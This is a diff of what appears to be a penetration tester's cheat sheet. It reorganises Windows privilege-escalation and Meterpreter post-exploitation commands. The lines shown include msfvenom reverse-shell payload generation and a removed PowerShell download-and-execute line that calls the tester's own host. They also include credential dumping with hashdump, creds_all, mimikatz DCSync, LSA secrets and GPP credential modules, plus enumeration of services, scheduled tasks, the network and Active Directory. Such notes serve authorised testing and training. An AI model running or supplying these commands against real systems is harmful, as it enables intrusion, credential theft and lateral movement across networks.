@@ -881,6 +881,10 @@ msfvenom -p python/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shell.py
 msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shell.py
 
 [*] Privilege Escalation
++---------- Initial Checks ----------+
+powershell -c "whoami /user /priv"
+powershell -c "cd \users; tree /a /f"
+
 +---------- Installed Apps ----------+
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 
@@ -906,8 +910,7 @@ echo -e 'import os\nos.popen("wget -qO /dev/shm/iZGYpy3w --no-check-certificate 
 dir C:\inetpub\wwwroot
 dir C:\xampp
 icacls C:\Windows\System32\Config
-whoami /priv
-cd C:\users; tree /f
+
 
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
 Get-ADComputer -Filter * | Select-Object Name
@@ -922,50 +925,61 @@ powershell -c "Set-ExecutionPolicy unrestricted"
 services.msc
 
 [*] Meterpreter
-sessions -t 120 -i 1
-load powershell
-powershell_import ~/Upload/windows/PrivescCheck.ps1
-powershell_execute "Invoke-PrivescCheck"
-run multi/recon/local_exploit_suggester
-powershell_execute "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
-
++---------- Load Modules ----------+
 load kiwi
 load exploit
 load priv
+load powershell
 
-getuid
-getprivs
++---------- Initial Checks ----------+
+powershell_execute "whoami /user /priv"
+powershell_execute "cd \users; tree /a /f"
+getsystem
 sysinfo
 ps
 migrate
+
++---------- Installed Apps ----------+
 powershell_execute "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 
-arp
++---------- Services and Unquoted Paths ----------+
+powershell_execute "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
+powershell_execute "wmic service get name,displayname,pathname,startmode |findstr /i 'auto' |findstr /i /v 'c:\windows'"
+
++---------- Scheduled Tasks ----------+
+powershell_execute "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
+powershell_execute "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task; $filePath = $task.Actions.Execute; Get-Acl $filePath | Select-Object PSChildName, PSPath, AccessToString"
+powershell_execute "Start-ScheduledTask -TaskName 'Ownership'"
+
++---------- Exploit Suggester ----------+
+run multi/recon/local_exploit_suggester
+
++---------- Dumping ----------+
+creds_all
+hashdump
+kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"
+run post/windows/gather/credentials/enum_cred_store
+run post/windows/gather/credentials/gpp
+run post/windows/gather/smart_hashdump
+run post/windows/gather/lsa_secrets
+run post/windows/gather/enum_unattend
+run post/windows/gather/credentials/windows_autologin
+
++---------- Network Environment ----------+
+powershell_execute "Get-NetTCPConnection -State Listen,Established | Where-Object { $_.LocalAddress -notin '0.0.0.0', '127.0.0.1' -and $_.RemoteAddress -notmatch '::' } | Sort-Object LocalAddress,LocalPort | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize"
+powershell_execute "arp"
+powershell_execute "route print"
+run post/multi/manage/autoroute
 run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
 ifconfig
 
-getsystem
-cd \\users
-
++---------- Domain Environment ----------+
 run post/windows/gather/enum_ad_users
 run post/windows/gather/enum_ad_computers
 run post/windows/gather/enum_domain
 run post/windows/gather/enum_domains
 
-run post/windows/gather/smart_hashdump
-run post/windows/gather/lsa_secrets
-run post/windows/gather/credentials/enum_cred_store
-run post/windows/gather/credentials/gpp
-run post/windows/gather/enum_unattend
-run post/windows/gather/credentials/windows_autologin
-
-hashdump
-creds_all
-kiwi_cmd "lsadump::dcsync /domain:$DOM /all /csv"
-
-cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
-reload_all
-
++---------- Sessions and Jobs ----------+
 background
 sessions
 sessions -i 1
